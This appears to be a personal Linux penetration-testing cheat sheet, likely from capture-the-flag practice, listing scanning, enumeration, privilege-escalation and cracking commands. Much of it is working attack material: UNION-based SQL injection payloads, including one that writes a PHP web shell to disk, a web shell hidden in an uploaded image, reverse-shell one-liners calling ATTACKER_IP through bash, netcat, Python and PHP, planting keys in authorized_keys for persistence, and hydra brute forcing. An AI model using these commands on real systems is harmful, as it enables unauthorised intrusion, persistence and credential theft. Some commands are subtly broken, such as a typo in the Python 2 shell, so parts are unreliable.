# Linux Pentesting Cheat Sheet

## User Access

### Port Scanning

#### TCP

- Look for open ports `nmap -p- -sS --open --min-rate 5000 -vvv -Pn -n TARGET_IP -N allPorts`

- Scan and extract service versions `nmap -p PORTS -sCV TARGET_IP -oN targeted`

#### UDP

- Look for open UDP ports `sudo nmap -p- -sU --min-rate 5000 -vvv -Pn -n TARGET_IP -oN allPortsUDP`

- Look for top UDP ports `sudo nmap --top-ports 100 -sU -Pn -n TARGET_IP -oN topUDP`

- Scan and extract service versions `sudo nmap -sUV -p PORTS -Pn -n TARGET_IP -oN udpScan`


### Web

#### SQL Injection
Insert SQL payloads in input fields to extract data from the database.

- `UNION SELECT 1,2,3 --`
    - To know the number of columns the query returns, increment the number until no error is returned.

- `UNION SELECT database() --`
    - To get the current database name.

- `UNION SELECT schema_name FROM information_schema.schemata --`
    - To get the database names.

- `UNION SELECT table_name FROM information_schema.tables WHERE table_schema='DATABASE_NAME' --`
    - To get the table names in the current database.

- `UNION SELECT column_name FROM information_schema.columns WHERE table_schema='DATABASE_NAME' AND table_name='TABLE_NAME' --`
    - To get the column names in a specific table.

- `UNION SELECT group_concat(column_name,0x3a,column_name) FROM 'DATABASE_NAME'.'TABLE_NAME' --`
    - To get the first 10 rows of data from specific columns in a specific table.

- `UNION SELECT "<?php ... ?>" INTO OUTFILE '/var/www/html/shell.php' --`
    - To write a web shell to the server (requires FILE privilege and writable directory).


#### Directory Listing

##### gobuster
- Scan for directories `gobuster dir -u http://TARGET_IP[:PORT] -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200`

    - To add extensions `-x .php,.html,.txt`
    - To filter results by status code `-s 200,204,301,302,307,401,403`
    - To filter results by size `-l SIZE`
    - To filter results by words `-w WORDS`
    - To filter results by lines `-c LINES`
    - To filter results by regex `-r REGEX`

##### ffuf
- Scan for directories `ffuf -u http://TARGET_IP[:PORT]/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200`

    - To add extensions `-e .php,.html,.txt`
    - To filter results by status code `-mc 200,204,301,302,307,401,403`
    - To filter results by size `-fs SIZE`
    - To filter results by words `-fw WORDS`
    - To filter results by lines `-fl LINES`
    - To filter results by regex `-mr REGEX`

##### dirsearch
- Scan for directories `python3 dirsearch.py -u http://TARGET_IP[:PORT] -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200`

    - To add extensions `-e php,html,txt`
    - To filter results by status code `-s 200,204,301,302,307,401,403`
    - To filter results by size `-l SIZE`
    - To filter results by words `-w WORDS`
    - To filter results by lines `-c LINES`
    - To filter results by regex `-r REGEX`

#### Subdomain Enumeration

##### gobuster
- Scan for subdomains `gobuster dns -d DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200`
    - To filter results by status code `-s 200,204,301,302,307,401,403`
    - To filter results by size `-l SIZE`
    - To filter results by words `-w WORDS`
    - To filter results by lines `-c LINES`
    - To filter results by regex `-r REGEX`

##### ffuf
- Scan for subdomains `ffuf -u http://SUBDOMAIN.DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 200 -H "Host: FUZZ.DOMAIN"`
    - To filter results by status code `-mc 200,204,301,302,307,401,403`
    - To filter results by size `-fs SIZE`
    - To filter results by words `-fw WORDS`
    - To filter results by lines `-fl LINES`
    - To filter results by regex `-mr REGEX`

##### sublist3r
- Scan for subdomains `python3 sublist3r.py -d DOMAIN -o subdomains.txt`
    - To use multiple threads `-t THREADS`
    - To use specific engines `-e google,bing,yahoo,ask,baidu,dogpile`
    - To use brute force `-b`
    - To use a custom wordlist for brute force `-w /path/to/wordlist`

#### Exposed Git Repositories
- git-dumper `git_dumper.py URL [OUTPUT_DIR]`
    - Example: `python git_dumper.py http://TARGET_IP[:PORT]/.git/ dump`

#### PHP

##### Image Upload Vulnerability
- Add a PHP payload to an image file `<?php system($_GET['cmd']);?>`
- Add `pre` tags to the payload to avoid corruption `<?php echo '<pre>'; system($_GET['cmd']); echo '</pre>'; ?>`

- ¿¿¿??? Use `exiftool` to add the PHP payload to the image file without corrupting it:
    - `exiftool -Comment='<?php system($_GET["cmd"]);?>' image.jpg`

- Upload the image file to the web server
- Access the uploaded image file and execute commands `http://TARGET_IP[:PORT]/path/to/uploaded/image.php?cmd=COMMAND`

#### Spring Boot

##### Actuator
This is a Spring Boot feature that provides endpoints for monitoring and managing applications.

### FTP

- Connect to FTP server `ftp TARGET_IP[:PORT]`
    - To login as anonymous user `anonymous`
    - To login with a username and password `USER USERNAME` then `PASS PASSWORD`
    - To list files and directories `ls` or `dir`
    - To change directory `cd DIRECTORY`
    - To download a file `get FILENAME`
    - To upload a file `put FILENAME`
    - To download multiple files `mget FILE1 FILE2 ...`
    - To upload multiple files `mput FILE1 FILE2 ...`
    - To exit the FTP session `bye` or `exit`

- LFTP (advanced FTP client)
    - Connect to FTP server `lftp ftp://USERNAME:PASSWORD@TARGET_IP[:PORT]`
    - To list files and directories `ls` or `dir`
    - To change directory `cd DIRECTORY`
    - To download a file `get FILENAME`
    - To upload a file `put FILENAME`
    - To download multiple files `mget FILE1 FILE2 ...`
    - To upload multiple files `mput FILE1 FILE2 ...`
    - To mirror a remote directory to a local directory `mirror REMOTE_DIR LOCAL_DIR`
    - To mirror a local directory to a remote directory `mirror -R LOCAL_DIR REMOTE_DIR`
    - To exit the LFTP session `bye` or `exit`

### Telnet
- Connect to Telnet server `telnet TARGET_IP[:PORT]`
    - To login with a username and password `USERNAME` then `PASSWORD`
    - To exit the Telnet session `exit` or `logout`

### VPN
- Connect to VPN server `openvpn --config /path/to/config.ovpn`
    - To check VPN status `systemctl status openvpn`
    - To stop VPN `systemctl stop openvpn`
    - To start VPN `systemctl start openvpn`

### DNS
- Perform DNS zone transfer `dig axfr @TARGET_IP DOMAIN`
    - To specify a different port `-p PORT`
    - To use TCP instead of UDP `+tcp`
    - To output in short format `+short`
    - To output in JSON format `+json`
    - To output in XML format `+xml`
    - To query specific record types `A`, `AAAA`, `CNAME`, `MX`, `NS`, `SOA`, `TXT`, etc.

### SSH
- Connect to SSH server `ssh USERNAME@TARGET_IP -p PORT`
    - To use a private key for authentication `-i /path/to/private_key`
    - To enable verbose mode for debugging `-v`, `-vv`, or `-vvv`
    - To execute a command on the remote server `ssh USERNAME@TARGET_IP -p PORT 'COMMAND'`
    - To copy files from local to remote `scp -P PORT /path/to/local_file USERNAME@TARGET_IP:/path/to/remote_file`
    - To copy files from remote to local `scp -P PORT USERNAME@TARGET_IP:/path/to/remote_file /path/to/local_file`
    - To exit the SSH session `exit` or `logout`

### Port Forwarding

#### ssh

- Forward a local port to a remote address and port `ssh -L LOCAL_PORT:REMOTE_ADDRESS:REMOTE_PORT USERNAME@TARGET_IP -p PORT`
    - To forward a remote port to a local address and port `ssh -R REMOTE_PORT:LOCAL_ADDRESS:LOCAL_PORT USERNAME@TARGET_IP -p PORT`
    - To create a dynamic SOCKS proxy `ssh -D LOCAL_PORT USERNAME@TARGET_IP -p PORT`
    - To enable verbose mode for debugging `-v`, `-vv`, or `-vvv`
    - To use a private key for authentication `-i /path/to/private_key`
    - To exit the SSH session `exit` or `logout`

#### chisel
- Start a chisel server `chisel server -p PORT --reverse`
- Start a chisel client `chisel client SERVER_IP:PORT LOCAL_PORT:REMOTE_ADDRESS:REMOTE_PORT`
    - To create a dynamic SOCKS proxy `chisel client SERVER_IP:PORT socks LOCAL_PORT`
    - To use a specific HTTP proxy `--proxy http://PROXY_IP:PROXY_PORT`
    - To use a specific username and password for the proxy `--proxy-user USERNAME --proxy-pass PASSWORD`


### Databases

#### MySQL
- Connect to MySQL server `mysql -h TARGET_IP -P PORT -u USERNAME -p`
    - To list databases `SHOW DATABASES;`
    - To use a specific database `USE DATABASE;`
    - To list tables in the current database `SHOW TABLES;`
    - To describe a table `DESCRIBE TABLE;`
    - To execute a query `SELECT * FROM TABLE;`
    - To exit MySQL `EXIT;` or `QUIT;`

#### PostgreSQL
- Connect to PostgreSQL server `psql -h TARGET_IP -p PORT -U USERNAME -d DATABASE`
    - To list databases `\l`
    - To connect to a specific database `\c DATABASE`
    - To list tables in the current database `\dt`
    - To describe a table `\d TABLE`
    - To execute a query `SELECT * FROM TABLE;`
    - To exit PostgreSQL `\q`

#### MongoDB
- Connect to MongoDB server `mongo --host TARGET_IP --port PORT -u USERNAME -p PASSWORD --authenticationDatabase DATABASE`
    - To list databases `show dbs`
    - To use a specific database `use DATABASE`
    - To list collections in the current database `show collections`
    - To execute a query `db.COLLECTION.find()`
    - To exit MongoDB `exit`

#### SQLite
- Connect to SQLite database `sqlite3 /path/to/database.db`
    - To list tables `.tables`
    - To describe a table `.schema TABLE`
    - To execute a query `SELECT * FROM TABLE;`
    - To exit SQLite `.exit` or `.quit`



### Reverse Shells
- Bash `bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1`
- Netcat traditional `nc -e /bin/sh ATTACKER_IP ATTACKER_PORT`
- Netcat openbsd `nc ATTACKER_IP ATTACKER_PORT -e /bin/sh`
- Python 2 `python -c 'import socket,subprocess,os;s=ocket.socket(socket.AF_INET,socket.SOCK_STREAM).connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- Python 3 `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM).connect(("ATTACKER_IP",ATTACKER_PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
- PHP `php -r '$sock=fsockopen("ATTACKER_IP",ATTACKER_PORT);exec("/bin/sh -i <&3 >&3 2>&3");'`


### TTY Shells
- Python 2 `python -c 'import pty;pty.spawn("/bin/bash")'`
- Python 3 `python3 -c 'import pty;pty.spawn("/bin/bash")'`
- Perl `perl -e 'exec "/bin/sh";'`
- Bash
    ```bash
    script /dev/null -c bash
    stty raw -echo; fg
    reset xterm
    export SHELL=bash
    export TERM=xterm-256color
    ```

### Isakamp
This is a protocol used for setting up VPNs.
- Scan this service using `ike-scan` `sudo ike-scan -A TARGET_IP`
    - To output the aggressive mode pre-shared key (PSK) parameters for offline cracking `sudo ike-scan -Ppsk.txt -A TARGET_IP`
    - To specify a different port `-p PORT`
    - To use a specific interface `-I INTERFACE`
    - To use a specific source IP address `-s SOURCE_IP`
    - To use a specific network interface `-i INTERFACE`
    - To use a specific timeout `-T TIMEOUT`
    - To use a specific number of retries `-r RETRIES`

## Privilege Escalation

### SSH

#### Keys

- Create a new pair of SSH keys `ssh-keygen -t rsa -b 4096 -f /path/to/key -C "COMMENT"`
    - To create a key without a passphrase `-N ""`
    - To create a key with a specific comment `-C "COMMENT"`
    - To create a key with a specific key type `-t rsa|dsa|ecdsa|ed25519`
    - To create a key with a specific key size `-b SIZE`

This generates two files:
- `/path/to/key`: Private key (keep this secret)
- `/path/to/key.pub`: Public key (can be shared)

##### Passphrase
If the private key is protected with a passphrase, you can use these tools to brute force it:
- `ssh2john` `ssh2john /path/to/key > ssh.hash` then `john --wordlist=WORDLIST ssh.hash`

##### Private

- Check for private keys in the home directory `find /home/ -name "*.ssh" -type d 2>/dev/null`
    - To check for private keys `find /home/ -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null`

- Connect using the private key `ssh -i /path/to/private_key USERNAME@TARGET_IP -p PORT`

##### Public

If a server has in its `~/.ssh/authorized_keys` file a public key for which you have the corresponding private key, you can use it to authenticate without needing a password.

- Check for public keys in the home directory `find /home/ -name "*.ssh" -type d 2>/dev/null`
    - To check for public keys `find /home/ -name "id_rsa.pub" -o -name "id_dsa.pub" -o -name "id_ecdsa.pub" -o -name "id_ed25519.pub" 2>/dev/null`

- Add your public key to the target user's `~/.ssh/authorized_keys` file `echo "YOUR_PUBLIC_KEY" >> /home/USERNAME/.ssh/authorized_keys`
    - To set the correct permissions `chmod 700 /home/USERNAME/.ssh` and `chmod 600 /home/USERNAME/.ssh/authorized_keys`

#### Port Forwarding

- Forward a local port to a remote address and port `ssh -L LOCAL_PORT:REMOTE_ADDRESS:REMOTE_PORT USERNAME@TARGET_IP -p PORT`
    - Access REMOTE_PORT on localhost:LOCAL_PORT
    
- Forward a remote port to a local address and port `ssh -R REMOTE_PORT:LOCAL_ADDRESS:LOCAL_PORT USERNAME@TARGET_IP -p PORT`
    - Access LOCAL_PORT on TARGET_IP:REMOTE_PORT

#### Brute Force
- Use `hydra` to brute force SSH credentials `hydra -L USERNAME_LIST -P PASSWORD_LIST -f -o hydra_results.txt -t 4 ssh://TARGET_IP`
    - To specify a single username `-l USERNAME`
    - To specify a single password `-p PASSWORD`
    - To stop after the first valid credential is found `-f`
    - To specify the number of parallel tasks `-t TASKS`
    - To specify a different port `-s PORT`
    

#### Pivoting
- Connect to a jump host and then to a target host through the jump host
    - Use `ssh -J JUMP_USER@JUMP_IP JUMP_PORT TARGET_USER@TARGET_IP -p TARGET_PORT`
    - Note: LOCAL_MACHINE -> JUMP_HOST -> TARGET_HOST
        - Local machine connects to jump host
        - Jump host connects to target host
        - Local machine does not have direct access to target host

- Forward a local port to a remote address and port through a jump host `ssh -J JUMP_USER@JUMP_IP JUMP_PORT -L LOCAL_PORT:REMOTE_ADDRESS:REMOTE_PORT TARGET_USER@TARGET_IP -p TARGET_PORT`
    - Access REMOTE_PORT on localhost:LOCAL_PORT
    - Note: LOCAL_MACHINE -> JUMP_HOST -> TARGET_HOST
        - Local machine connects to jump host
        - Jump host connects to target host
        - Local machine does not have direct access to target host


    - To create a dynamic SOCKS proxy `ssh -D LOCAL_PORT USERNAME@TARGET_IP -p PORT`
    - To enable verbose mode for debugging `-v`, `-vv`, or `-vvv`
    - To use a private key for authentication `-i /path/to/private_key`
    - To exit the SSH session `exit` or `logout`

<!-- - Check for SSH keys in the home directory `find /home/ -name "*.ssh" -type d 2>/dev/null`
    - To check for private keys `find /home/ -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null`
    - To check for config files `find /home/ -name "config" 2>/dev/null` -->

-

### To check
- Current user `whoami`
- Home directory `echo $HOME`
- Identity information `id`
- Sudo privileges `sudo -l`
- Processes `ps aux` or `ps -ef`
- Network configuration `ifconfig` or `ip a`
- Open network connections `netstat -tuln` or `ss -tuln
- Cron jobs `crontab -l` and `ls -la /etc/cron*`
- Capabilities `getcap -r / 2>/dev/null`
- SUID/SGID files `find / -perm -4000 -o -perm -2000 -type f 2>/dev/null`
- Writable files and directories `find / -writable -type f 2>/dev/null` and `find / -writable -type d 2>/dev/null`
- World readable files `find / -perm -o=r -type f 2>/dev/null`
- World writable files `find / -perm -o=w -type f 2>/dev/null`
- Check bash history `cat ~/.bash_history`
- Kernel information `uname -a`

### GPG
Encrypt and decrypt files using asymmetric encryption.
    - One key crypts ->  public key
    - One key decrypts -> private key

#### Files
- GPG saves keys and configuration in `~/.gnupg/`
- GPG encrypted files have `.gpg` or `.asc` extension
- `pubring.gpg`: Public keys
- `private-keys-v1.d`: Private keys
- `trustdb.gpg`: Trust database

#### Key Management
- Create a new key pair `gpg --full-generate-key`
- List keys `gpg --list-keys` and `gpg --list-secret-keys`
- Import a key `gpg --import KEY_FILE`
- Export a public key `gpg --export -a "USER_NAME" > public.key`
- Export a private key `gpg --export-secret-keys -a "USER_NAME" > private.key`
- Delete a key `gpg --delete-key "USER_NAME"` and `gpg --delete-secret-key "USER_NAME"`

#### Encryption
- Encrypt a file `gpg --encrypt -r "USER_NAME" FILE`
    - USER_NAME: The name or email associated with the public key to use for encryption

#### Decryption
- Decrypt a file `gpg --decrypt FILE.gpg > decrypted.txt`
    - If the private key is password protected, you will be prompted to enter the passphrase

- `$GNUPGHOME/` should have `700` permissions
- `$GNUPGHOME/*` files inside should have `600` permissions

- if $GNUPGHOME is not set, it defaults to `~/.gnupg/`

##### Brute forcing GPG passphrase
If passphrase is needed to decrypt the file, use this tools to brute force it:
- `gpg2john` `gpg2john FILE.gpg > gpg.hash` then `john --wordlist=WORDLIST gpg.hash`
- `gpg-brute` `gpg-brute -f FILE.gpg -w WORDLIST`
- `gpgcrack` `gpgcrack -f FILE.gpg -w WORDLIST`
- `gpg-pwcrack` `gpg-pwcrack -f FILE.gpg -w WORDLIST`
- `john` `john --wordlist=WORDLIST --format=gpg FILE.gpg`
- `hashcat` `hashcat -m 15700 FILE.gpg WORDLIST`

### Sudo
- Check sudo privileges `sudo -l`

#### Special variables
- env_keep: Environment variables to keep when running commands with sudo

### Signed Binaries

#### Creation
- Create a self-signed certificate `openssl cms -sign -in FILE -signer CERT.pem -inkey KEY.pem -outform PEM -out FILE.signed -binary -nosmimecap -nodetach -nocerts -noattr`
- Combine signature with binary `objcopy --add-section .text_sig=monitor.sig monitor monitor.signed`



## Tools

### Custom process monitoring
```bash
#!/bin/bash

INTERVAL=1
oldps=/tmp/oldps
newps=/tmp/newps
ps aux > $oldps

while true; do
        ps aux > $newps
        if diff -q $oldps $newps >/dev/null; then
                echo ""
        else
                diff $oldps $newps | grep ">"  | grep -v "ps aux" # solo los procesos nuevos
        fi
        sleep $INTERVAL
        cp $newps $oldps
done;
```


### Java decompilers
Transpile Java bytecode back into readable Java source code using one of the following tools:
- `jd-gui` (GUI application)
- `cfr` (command line tool)
- `http://www.javadecompilers.com/`

### Hash Cracking

#### Triple DES
- Decrypt the password from base64 to hex `echo "BASE64_ENCODED_PASSWORD" | base64 -d | xxd -p -c 256`
    - L7Rv00A8TuwJAr67kITxxcSgnIk25Am/ -> 2fb46fd3403c4eec0902bebb9084f1c5c4a09c8936e409bf
- Use first 8 bytes as IV: `2fb46fd3403c4eec`
- Use 24 byte key: `rcmail-!24ByteDESkey*Str`
- Use Triple DES to decrypt the rest of the hex string: ¿¿¿???`echo "CIPHERTEXT_HEX" | xxd -r -p | openssl enc -d -des-ede3-cbc -K $(echo -n "rcmail-!24ByteDESkey*Str" | xxd -p) -iv 2fb46fd3403c4eec`
    - CIPHERTEXT_HEX: `403c4eec0902bebb9084f1c5c4a09c8936e409bf`

#### hashcat
- To crack a hash `hashcat -m HASH_TYPE -a 0 HASH_FILE WORDLIST`
    - To specify the number of threads `-T THREADS`

#### john
- To crack a hash `john --format=HASH_TYPE --wordlist=WORDLIST HASH_FILE`
    - To show cracked passwords `john --show HASH_FILE`

#### crackstation
- To crack a hash, go to `https://crackstation.net/` and enter the hash in the provided field.

